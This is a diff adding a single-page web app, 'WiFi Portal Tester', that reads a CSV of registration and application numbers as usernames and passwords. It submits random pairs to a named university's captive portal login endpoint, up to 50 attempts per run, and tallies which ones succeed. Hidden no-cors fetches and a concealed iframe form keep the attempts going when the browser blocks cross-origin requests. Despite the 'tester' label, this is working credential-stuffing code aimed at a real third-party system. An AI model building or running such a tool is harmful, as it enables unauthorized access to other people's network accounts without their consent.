@@ -1,0 +1,966 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="theme-color" content="#0f172a">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="WiFi Tester">
+  <meta name="description" content="Mobile-first Progressive Web App for testing captive portal Wi-Fi authentication systems.">
+  
+  <link rel="manifest" href="manifest.webmanifest">
+  <link rel="icon" href="icon.svg" type="image/svg+xml">
+  <link rel="apple-touch-icon" href="apple-touch-icon.png">
+  
+  <title>WiFi Portal Tester</title>
+  
+  <style>
+    :root {
+      --bg-main: #0f172a;
+      --bg-card: #1e293b;
+      --bg-input: #334155;
+      --border-color: #475569;
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+      --primary: #3b82f6;
+      --primary-hover: #2563eb;
+      --accent: #10b981;
+      --warning: #f59e0b;
+      --danger: #ef4444;
+      --radius: 16px;
+      --shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.3);
+      --font: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    @media (prefers-color-scheme: light) {
+      :root {
+        --bg-main: #f1f5f9;
+        --bg-card: #ffffff;
+        --bg-input: #e2e8f0;
+        --border-color: #cbd5e1;
+        --text-main: #0f172a;
+        --text-muted: #64748b;
+        --primary: #2563eb;
+        --primary-hover: #1d4ed8;
+        --shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.04);
+      }
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: var(--font);
+      background-color: var(--bg-main);
+      color: var(--text-main);
+      min-height: 100vh;
+      padding: 16px 12px 40px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      line-height: 1.5;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 520px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    /* Header */
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 8px 4px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .brand-icon {
+      width: 42px;
+      height: 42px;
+      background: linear-gradient(135deg, var(--primary), #8b5cf6);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+    }
+
+    .brand-icon svg {
+      width: 24px;
+      height: 24px;
+      fill: #ffffff;
+    }
+
+    .brand-text h1 {
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .brand-text p {
+      font-size: 12px;
+      color: var(--text-muted);
+    }
+
+    .install-btn {
+      display: none;
+      background: rgba(59, 130, 246, 0.15);
+      color: var(--primary);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .install-btn:hover {
+      background: var(--primary);
+      color: #fff;
+    }
+
+    /* Cards */
+    .card {
+      background: var(--bg-card);
+      border-radius: var(--radius);
+      padding: 20px;
+      border: 1px solid var(--border-color);
+      box-shadow: var(--shadow);
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .card-title {
+      font-size: 16px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .badge {
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .badge-inactive {
+      background: rgba(148, 163, 184, 0.2);
+      color: var(--text-muted);
+    }
+
+    .badge-active {
+      background: rgba(16, 185, 129, 0.2);
+      color: var(--accent);
+    }
+
+    .badge-warning {
+      background: rgba(245, 158, 11, 0.2);
+      color: var(--warning);
+    }
+
+    /* Form Controls */
+    .file-input-wrapper {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .file-input-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 14px;
+      background: var(--bg-input);
+      border: 2px dashed var(--border-color);
+      border-radius: 12px;
+      color: var(--text-main);
+      font-weight: 600;
+      font-size: 15px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      text-align: center;
+    }
+
+    .file-input-btn:hover {
+      border-color: var(--primary);
+      background: rgba(59, 130, 246, 0.05);
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+
+    .btn {
+      width: 100%;
+      min-height: 50px;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: all 0.2s ease;
+    }
+
+    .btn-primary {
+      background: var(--primary);
+      color: #ffffff;
+      box-shadow: 0 4px 14px rgba(59, 130, 246, 0.35);
+    }
+
+    .btn-primary:hover:not(:disabled) {
+      background: var(--primary-hover);
+      transform: translateY(-1px);
+    }
+
+    .btn-primary:active:not(:disabled) {
+      transform: translateY(0);
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .btn-outline {
+      background: transparent;
+      border: 1px solid var(--border-color);
+      color: var(--text-main);
+    }
+
+    .btn-outline:hover:not(:disabled) {
+      background: var(--bg-input);
+    }
+
+    /* Test Settings */
+    .setting-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      font-size: 14px;
+    }
+
+    .setting-input {
+      width: 80px;
+      padding: 8px 12px;
+      border-radius: 8px;
+      border: 1px solid var(--border-color);
+      background: var(--bg-input);
+      color: var(--text-main);
+      font-size: 14px;
+      text-align: center;
+    }
+
+    /* Selected Credential Display */
+    .cred-box {
+      background: var(--bg-input);
+      border-radius: 12px;
+      padding: 14px 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      border: 1px solid var(--border-color);
+    }
+
+    .cred-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 14px;
+    }
+
+    .cred-label {
+      color: var(--text-muted);
+      font-size: 13px;
+    }
+
+    .cred-value {
+      font-family: monospace;
+      font-size: 15px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .toggle-pass-btn {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      padding: 2px 4px;
+      display: inline-flex;
+      align-items: center;
+    }
+
+    .toggle-pass-btn:hover {
+      color: var(--text-main);
+    }
+
+    /* Stats Grid */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+    }
+
+    .stat-card {
+      background: var(--bg-input);
+      border-radius: 12px;
+      padding: 12px 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .stat-value {
+      font-size: 20px;
+      font-weight: 700;
+    }
+
+    .stat-label {
+      font-size: 12px;
+      color: var(--text-muted);
+    }
+
+    .stat-full {
+      grid-column: span 2;
+    }
+
+    /* Status Banner */
+    .status-banner {
+      padding: 12px 14px;
+      border-radius: 10px;
+      font-size: 13px;
+      line-height: 1.4;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      background: rgba(148, 163, 184, 0.1);
+      border: 1px solid var(--border-color);
+    }
+
+    .status-icon {
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    /* Modal / Accordion */
+    details {
+      background: var(--bg-input);
+      border-radius: 12px;
+      border: 1px solid var(--border-color);
+      overflow: hidden;
+    }
+
+    summary {
+      padding: 14px 16px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      user-select: none;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .details-content {
+      padding: 0 16px 16px 16px;
+      font-size: 13px;
+      color: var(--text-muted);
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .details-content ol {
+      padding-left: 18px;
+    }
+
+    .details-content li {
+      margin-bottom: 4px;
+    }
+
+    /* Security Note */
+    .security-note {
+      font-size: 12px;
+      color: var(--text-muted);
+      text-align: center;
+      padding: 8px;
+    }
+
+    /* Loading Spinner */
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- Header -->
+  <header>
+    <div class="brand">
+      <div class="brand-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 3C6.95 3 2.55 5.5 0 9.34L12 21L24 9.34C21.45 5.5 17.05 3 12 3ZM12 6C15.6 6 18.9 7.6 20.8 10.2L12 18.8L3.2 10.2C5.1 7.6 8.4 6 12 6Z"/>
+        </svg>
+      </div>
+      <div class="brand-text">
+        <h1>WiFi Portal Tester</h1>
+        <p>Captive Portal Validation Utility</p>
+      </div>
+    </div>
+    <button id="pwaInstallBtn" class="install-btn">Install App</button>
+  </header>
+
+  <!-- CSV Import Card -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-title">
+        <span>📁 Dataset Import</span>
+      </div>
+      <span id="csvStatusBadge" class="badge badge-inactive">No CSV Loaded</span>
+    </div>
+
+    <div class="file-input-wrapper">
+      <label for="csvFileInput" class="file-input-btn" id="fileInputLabel">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/>
+        </svg>
+        <span id="fileInputText">Select or Drop CSV File</span>
+      </label>
+      <input type="file" id="csvFileInput" accept=".csv,text/csv">
+    </div>
+
+    <div id="accountCountBanner" class="status-banner" style="display:none;">
+      <span class="status-icon">ℹ️</span>
+      <div id="accountCountText">Accounts loaded: 0</div>
+    </div>
+  </div>
+
+  <!-- Execution Controls Card -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-title">
+        <span>🎲 Test Controls</span>
+      </div>
+      <span id="testStateBadge" class="badge badge-inactive">Idle</span>
+    </div>
+
+    <div class="setting-row">
+      <label for="testCountInput">Number of random tests to run:</label>
+      <input type="number" id="testCountInput" class="setting-input" value="1" min="1" max="50">
+    </div>
+
+    <button id="testBtn" class="btn btn-primary" disabled>
+      <span id="testBtnIcon">🎲</span>
+      <span id="testBtnText">Test Random Credential</span>
+    </button>
+  </div>
+
+  <!-- Selected Credential & Result Card -->
+  <div class="card" id="credentialCard">
+    <div class="card-header">
+      <div class="card-title">
+        <span>🔑 Selected Credential</span>
+      </div>
+      <span id="endpointBadge" class="badge badge-inactive">POST mode=191</span>
+    </div>
+
+    <div class="cred-box">
+      <div class="cred-row">
+        <span class="cred-label">Username (Reg.No):</span>
+        <span class="cred-value" id="dispUsername">--</span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Password (App.No):</span>
+        <span class="cred-value">
+          <span id="dispPassword">--</span>
+          <button id="togglePassBtn" class="toggle-pass-btn" title="Toggle password visibility" style="display:none;">
+            👁️
+          </button>
+        </span>
+      </div>
+      <div class="cred-row">
+        <span class="cred-label">Timestamp (a):</span>
+        <span class="cred-value" id="dispTimestamp" style="font-size:12px; color:var(--text-muted);">--</span>
+      </div>
+    </div>
+
+    <div id="lastResultBanner" class="status-banner">
+      <span class="status-icon" id="resultIcon">⏱️</span>
+      <div id="resultText">Load a CSV and click Test to evaluate credentials.</div>
+    </div>
+  </div>
+
+  <!-- Session Dashboard -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-title">
+        <span>📊 Session Dashboard</span>
+      </div>
+      <button id="resetStatsBtn" class="btn-outline" style="padding: 4px 10px; font-size:12px; border-radius:8px; width:auto; min-height:auto;">Reset Stats</button>
+    </div>
+
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-value" id="statAttempted">0</div>
+        <div class="stat-label">Tests Attempted</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="statAvgTime">-</div>
+        <div class="stat-label">Avg Response Time</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="statVerifiedSuccess" style="color:var(--accent);">0</div>
+        <div class="stat-label">Verified Success</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-value" id="statVerifiedFailed" style="color:var(--danger);">0</div>
+        <div class="stat-label">Verified Failed</div>
+      </div>
+      <div class="stat-card stat-full">
+        <div class="stat-value" id="statUnverified" style="color:var(--warning);">0</div>
+        <div class="stat-label">Submitted — Response Unverifiable (CORS/Opaque)</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- App Installation & Info Accordion -->
+  <details>
+    <summary>
+      <span>📱 How to Install as PWA App</span>
+      <span>▼</span>
+    </summary>
+    <div class="details-content">
+      <p><b>Android / Chrome:</b></p>
+      <ol>
+        <li>Tap the browser menu (3 dots at top right).</li>
+        <li>Tap <b>"Add to Home screen"</b> or <b>"Install app"</b>.</li>
+      </ol>
+      <p><b>iPhone / iOS Safari:</b></p>
+      <ol>
+        <li>Tap the <b>Share button</b> (box with arrow pointing up) at bottom bar.</li>
+        <li>Scroll down and tap <b>"Add to Home Screen"</b>.</li>
+      </ol>
+    </div>
+  </details>
+
+  <details>
+    <summary>
+      <span>🔒 Security & Local Data Privacy</span>
+      <span>▼</span>
+    </summary>
+    <div class="details-content">
+      <p>• Your imported CSV remains strictly local in your browser's volatile memory.</p>
+      <p>• No credentials are stored in localStorage, IndexedDB, cookies, or any remote database.</p>
+      <p>• Captive portal URL: <code>https://captiveportal.kluniversity.in:8090/login.xml</code></p>
+    </div>
+  </details>
+
+  <div class="security-note">
+    WiFi Captive Portal Tester • Modern Mobile-First PWA
+  </div>
+</div>
+
+<!-- Hidden HTML Form for fallback iframe submission -->
+<iframe name="portal_target_iframe" id="portalTargetIframe" style="display:none;"></iframe>
+<form id="captiveLoginForm" action="https://captiveportal.kluniversity.in:8090/login.xml" method="POST" target="portal_target_iframe" style="display:none;">
+  <input type="hidden" name="mode" value="191">
+  <input type="hidden" name="username" id="formUsername">
+  <input type="hidden" name="password" id="formPassword">
+  <input type="hidden" name="a" id="formTimestamp">
+  <input type="hidden" name="producttype" value="0">
+</form>
+
+<script>
+// State Management
+let credentials = [];
+let rawSelectedPassword = "";
+let showPasswordText = false;
+let isTesting = false;
+
+let stats = {
+  attempted: 0,
+  verifiedSuccess: 0,
+  verifiedFailed: 0,
+  unverifiedSubmitted: 0,
+  totalTimeMs: 0
+};
+
+// DOM References
+const csvFileInput = document.getElementById("csvFileInput");
+const fileInputLabel = document.getElementById("fileInputLabel");
+const fileInputText = document.getElementById("fileInputText");
+const csvStatusBadge = document.getElementById("csvStatusBadge");
+const accountCountBanner = document.getElementById("accountCountBanner");
+const accountCountText = document.getElementById("accountCountText");
+
+const testBtn = document.getElementById("testBtn");
+const testBtnText = document.getElementById("testBtnText");
+const testBtnIcon = document.getElementById("testBtnIcon");
+const testStateBadge = document.getElementById("testStateBadge");
+const testCountInput = document.getElementById("testCountInput");
+
+const dispUsername = document.getElementById("dispUsername");
+const dispPassword = document.getElementById("dispPassword");
+const togglePassBtn = document.getElementById("togglePassBtn");
+const dispTimestamp = document.getElementById("dispTimestamp");
+
+const lastResultBanner = document.getElementById("lastResultBanner");
+const resultIcon = document.getElementById("resultIcon");
+const resultText = document.getElementById("resultText");
+
+const statAttempted = document.getElementById("statAttempted");
+const statAvgTime = document.getElementById("statAvgTime");
+const statVerifiedSuccess = document.getElementById("statVerifiedSuccess");
+const statVerifiedFailed = document.getElementById("statVerifiedFailed");
+const statUnverified = document.getElementById("statUnverified");
+const resetStatsBtn = document.getElementById("resetStatsBtn");
+
+const pwaInstallBtn = document.getElementById("pwaInstallBtn");
+
+// Event Listeners
+csvFileInput.addEventListener("change", handleFileSelect);
+
+// Drag and Drop support
+fileInputLabel.addEventListener("dragover", (e) => {
+  e.preventDefault();
+  fileInputLabel.style.borderColor = "var(--primary)";
+});
+fileInputLabel.addEventListener("dragleave", () => {
+  fileInputLabel.style.borderColor = "var(--border-color)";
+});
+fileInputLabel.addEventListener("drop", (e) => {
+  e.preventDefault();
+  fileInputLabel.style.borderColor = "var(--border-color)";
+  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+    csvFileInput.files = e.dataTransfer.files;
+    handleFileSelect();
+  }
+});
+
+testBtn.addEventListener("click", executeTests);
+togglePassBtn.addEventListener("click", togglePasswordVisibility);
+resetStatsBtn.addEventListener("click", resetSessionStats);
+
+// PWA Install Prompt handling
+let deferredPrompt = null;
+window.addEventListener("beforeinstallprompt", (e) => {
+  e.preventDefault();
+  deferredPrompt = e;
+  pwaInstallBtn.style.display = "block";
+});
+
+pwaInstallBtn.addEventListener("click", async () => {
+  if (deferredPrompt) {
+    deferredPrompt.prompt();
+    const { outcome } = await deferredPrompt.userChoice;
+    if (outcome === "accepted") {
+      pwaInstallBtn.style.display = "none";
+    }
+    deferredPrompt = null;
+  }
+});
+
+// CSV Handling
+async function handleFileSelect() {
+  const file = csvFileInput.files[0];
+  if (!file) return;
+
+  try {
+    const text = await file.text();
+    credentials = parseCSV(text);
+
+    if (credentials.length === 0) {
+      csvStatusBadge.textContent = "Invalid CSV";
+      csvStatusBadge.className = "badge badge-warning";
+      accountCountBanner.style.display = "flex";
+      accountCountText.textContent = "No valid Reg.No / App.No rows found in file.";
+      testBtn.disabled = true;
+      return;
+    }
+
+    csvStatusBadge.textContent = "CSV Loaded";
+    csvStatusBadge.className = "badge badge-active";
+    fileInputText.textContent = `File Loaded: ${file.name}`;
+    accountCountBanner.style.display = "flex";
+    accountCountText.innerHTML = `<b>Accounts loaded: ${credentials.length}</b>`;
+    testBtn.disabled = false;
+    testStateBadge.textContent = "Ready";
+    testStateBadge.className = "badge badge-active";
+  } catch (err) {
+    csvStatusBadge.textContent = "Error";
+    csvStatusBadge.className = "badge badge-warning";
+    accountCountBanner.style.display = "flex";
+    accountCountText.textContent = "Error reading CSV: " + err.message;
+    testBtn.disabled = true;
+  }
+}
+
+function parseCSV(text) {
+  const rows = [];
+  let row = [], field = "", quoted = false;
+
+  for (let i = 0; i < text.length; i++) {
+    const c = text[i];
+    if (c === '"') {
+      if (quoted && text[i + 1] === '"') {
+        field += '"'; i++;
+      } else {
+        quoted = !quoted;
+      }
+    } else if (c === ',' && !quoted) {
+      row.push(field.trim()); field = "";
+    } else if ((c === '\n' || c === '\r') && !quoted) {
+      if (c === '\r' && text[i + 1] === '\n') i++;
+      row.push(field.trim()); field = "";
+      if (row.some(v => v !== "")) rows.push(row);
+      row = [];
+    } else {
+      field += c;
+    }
+  }
+  if (field !== "" || row.length) {
+    row.push(field.trim());
+    if (row.some(v => v !== "")) rows.push(row);
+  }
+
+  if (rows.length < 2) return [];
+
+  // Normalize header line
+  const headers = rows[0].map(h => h.replace(/^\uFEFF/, "").trim().toLowerCase().replace(/\s+/g, " "));
+
+  const appIndex = findHeaderIndex(headers, ["app.no", "app no", "appno", "application no", "application number", "pass", "password"]);
+  const regIndex = findHeaderIndex(headers, ["reg.no", "reg no", "regno", "registered no", "registration no", "user", "username"]);
+
+  if (appIndex < 0 || regIndex < 0) {
+    throw new Error("Could not detect Reg.No and App.No header columns.");
+  }
+
+  return rows.slice(1)
+    .map(r => ({
+      username: (r[regIndex] || "").trim(),
+      password: (r[appIndex] || "").trim()
+    }))
+    .filter(x => x.username && x.password);
+}
+
+function findHeaderIndex(headers, candidates) {
+  return headers.findIndex(h => candidates.includes(h));
+}
+
+// Test Execution
+async function executeTests() {
+  if (!credentials.length || isTesting) return;
+
+  const count = Math.min(Math.max(parseInt(testCountInput.value) || 1, 1), 50);
+  isTesting = true;
+  testBtn.disabled = true;
+  testStateBadge.textContent = "Testing...";
+  testStateBadge.className = "badge badge-warning";
+  testBtnText.textContent = "Testing...";
+  testBtnIcon.innerHTML = `<div class="spinner"></div>`;
+
+  for (let i = 0; i < count; i++) {
+    const randomIndex = Math.floor(Math.random() * credentials.length);
+    const selected = credentials[randomIndex];
+    const timestamp = Date.now().toString();
+
+    // Display selected credential with masked password
+    rawSelectedPassword = selected.password;
+    dispUsername.textContent = selected.username;
+    updatePasswordDisplay();
+    togglePassBtn.style.display = "inline-flex";
+    dispTimestamp.textContent = timestamp;
+
+    const startTime = performance.now();
+    let result = await sendPortalPOST(selected.username, selected.password, timestamp);
+    const elapsedMs = Math.round(performance.now() - startTime);
+
+    updateStatsAndUI(result, elapsedMs, selected.username);
+
+    // Short delay if running multiple tests
+    if (i < count - 1) {
+      await new Promise(r => setTimeout(r, 600));
+    }
+  }
+
+  isTesting = false;
+  testBtn.disabled = false;
+  testBtnText.textContent = "Test Random Credential";
+  testBtnIcon.textContent = "🎲";
+  testStateBadge.textContent = "Ready";
+  testStateBadge.className = "badge badge-active";
+}
+
+async function sendPortalPOST(username, password, timestamp) {
+  const portalUrl = "https://captiveportal.kluniversity.in:8090/login.xml";
+  const params = new URLSearchParams({
+    mode: "191",
+    username: username,
+    password: password,
+    a: timestamp,
+    producttype: "0"
+  });
+
+  try {
+    // Attempt standard CORS fetch first
+    const response = await fetch(portalUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: params,
+      mode: "cors"
+    });
+
+    const text = await response.text();
+    if (response.ok && (text.includes("ack") || text.includes("message") || text.includes("success"))) {
+      return { status: "SUCCESS", message: "Response received: Login acknowledged by server." };
+    } else {
+      return { status: "FAILED", message: `Portal returned HTTP ${response.status}.` };
+    }
+  } catch (err) {
+    // Standard CORS fetch failed (most common when captive portal disables Access-Control-Allow-Origin).
+    // Try opaque mode fetch to send the real request without unhandled JS exception.
+    try {
+      await fetch(portalUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: params,
+        mode: "no-cors"
+      });
+
+      // Also trigger form submission target iframe so browser network layer completes POST
+      document.getElementById("formUsername").value = username;
+      document.getElementById("formPassword").value = password;
+      document.getElementById("formTimestamp").value = timestamp;
+      document.getElementById("captiveLoginForm").submit();
+
+      return {
+        status: "UNVERIFIABLE",
+        message: "Submitted — response cannot be verified by browser (CORS opaque mode)."
+      };
+    } catch (opaqueErr) {
+      return {
+        status: "NETWORK_ERROR",
+        message: "Network failure / captive portal endpoint unreachable."
+      };
+    }
+  }
+}
+
+function updateStatsAndUI(result, elapsedMs, username) {
+  stats.attempted++;
+  stats.totalTimeMs += elapsedMs;
+
+  if (result.status === "SUCCESS") {
+    stats.verifiedSuccess++;
+    resultIcon.textContent = "✅";
+    resultText.innerHTML = `<b>Success (${elapsedMs} ms)</b><br>User: ${escapeHtml(username)} - ${result.message}`;
+  } else if (result.status === "FAILED") {
+    stats.verifiedFailed++;
+    resultIcon.textContent = "❌";
+    resultText.innerHTML = `<b>Failed (${elapsedMs} ms)</b><br>User: ${escapeHtml(username)} - ${result.message}`;
+  } else if (result.status === "UNVERIFIABLE") {
+    stats.unverifiedSubmitted++;
+    resultIcon.textContent = "⚠️";
+    resultText.innerHTML = `<b>Submitted (${elapsedMs} ms)</b><br>Response cannot be verified by browser (CORS restricted).`;
+  } else {
+    stats.verifiedFailed++;
+    resultIcon.textContent = "🚫";
+    resultText.innerHTML = `<b>Network Error</b><br>Portal unreachable or offline.`;
+  }
+
+  // Update UI Stats
+  statAttempted.textContent = stats.attempted;
+  statVerifiedSuccess.textContent = stats.verifiedSuccess;
+  statVerifiedFailed.textContent = stats.verifiedFailed;
+  statUnverified.textContent = stats.unverifiedSubmitted;
+
+  const avg = stats.attempted > 0 ? Math.round(stats.totalTimeMs / stats.attempted) : 0;
+  statAvgTime.textContent = avg > 0 ? `${avg} ms` : "-";
+}
+
+function togglePasswordVisibility() {
+  showPasswordText = !showPasswordText;
+  togglePassBtn.textContent = showPasswordText ? "🙈" : "👁️";
+  updatePasswordDisplay();
+}
+
+function updatePasswordDisplay() {
+  if (!rawSelectedPassword) {
+    dispPassword.textContent = "--";
+    return;
+  }
+  dispPassword.textContent = showPasswordText ? rawSelectedPassword : "*".repeat(Math.max(rawSelectedPassword.length, 8));
+}
+
+function resetSessionStats() {
+  stats = { attempted: 0, verifiedSuccess: 0, verifiedFailed: 0, unverifiedSubmitted: 0, totalTimeMs: 0 };
+  statAttempted.textContent = "0";
+  statVerifiedSuccess.textContent = "0";
+  statVerifiedFailed.textContent = "0";
+  statUnverified.textContent = "0";
+  statAvgTime.textContent = "-";
+  resultIcon.textContent = "⏱️";
+  resultText.textContent = "Stats reset. Click Test to evaluate credentials.";
+}
+
+function escapeHtml(v) {
+  return String(v).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+
+// Service Worker Registration
+if ("serviceWorker" in navigator) {
+  window.addEventListener("load", () => {
+    navigator.serviceWorker.register("./sw.js").catch(console.error);
+  });
+}
+</script>
+
+</body>
+</html>
